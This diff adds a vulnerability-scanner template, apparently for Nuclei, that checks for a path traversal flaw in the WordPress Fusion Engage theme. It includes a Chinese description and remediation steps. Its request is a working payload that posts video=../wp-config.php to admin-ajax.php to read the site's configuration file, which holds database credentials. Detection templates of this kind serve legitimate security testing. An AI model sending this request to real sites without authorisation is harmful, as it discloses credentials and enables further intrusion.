@@ -1,0 +1,33 @@
+id: Wordpress-Fusion_Engage_Plugins-FileDisclosure
+info:
+  name: WordPress Fusion Engage Local File Disclosure
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Theme Fusion Engage 目录穿越导致文件下载漏洞
+    WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一种应用插件。
+
+    WordPress Fusion Engage theme 存在路径遍历漏洞，该漏洞允许远程攻击者通过video参数读取系统中的任意文件。
+  reference:
+  - https://www.bugscan.net/#!/x/21614
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.org/themes/
+
+    临时修复方案：
+    1、过滤\".\"，使用户在url中不能回溯上级目录。
+    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
+    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
+    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
+    5、用户下载文件之前进行权限校验。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - ' contains(body,"The base configurations of the WordPress") && status_code==200 '
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/wp-admin/admin-ajax.php'
+  method: POST
+  body: action=fe_get_sv_html&video=../wp-config.php
